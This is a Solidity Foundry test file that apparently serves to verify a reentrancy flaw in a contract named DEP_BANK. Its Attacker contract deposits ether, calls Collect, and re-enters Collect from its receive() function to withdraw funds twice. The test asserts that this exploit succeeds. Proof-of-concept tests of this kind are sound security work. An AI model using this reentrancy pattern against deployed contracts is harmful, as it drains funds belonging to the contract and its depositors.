
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {DEP_BANK, LogFile} from "../src/DEP_BANK.sol";

contract TestReentrancyDEP_BANK is Test {
    DEP_BANK public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new DEP_BANK();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(0.01 ether);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 0.01 ether && attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The vulnerable function requires balances[msg.sender] >= MinSum && balances[msg.sender] >= _am
        // This is handled in setupAttack by depositing funds

        // --- 3. Funding ---
        // Fund the Victim contract with extra ETH so there's something to drain
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    DEP_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = DEP_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds to meet the balance requirement for Collect
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // Capture Initial State
        initialSnapshot = address(this).balance;

        // Store the value for the re-entrant call
        storedAttackVal = val;

        // Call the vulnerable Collect function
        _victim.Collect(val);

        // Verify Success Conditions
        // If we managed to call Collect multiple times via reentrancy
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
        
        // Also check if we received more than we deposited
        if (address(this).balance > initialSnapshot + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        if (attackCallCount < 2) {
            // Check if victim still has enough balance and our recorded balance allows withdrawal
            if (address(_victim).balance >= storedAttackVal && _victim.balances(address(this)) >= storedAttackVal) {
                // Re-enter the Collect function
                _victim.Collect(storedAttackVal);
            }
        }
    }
}
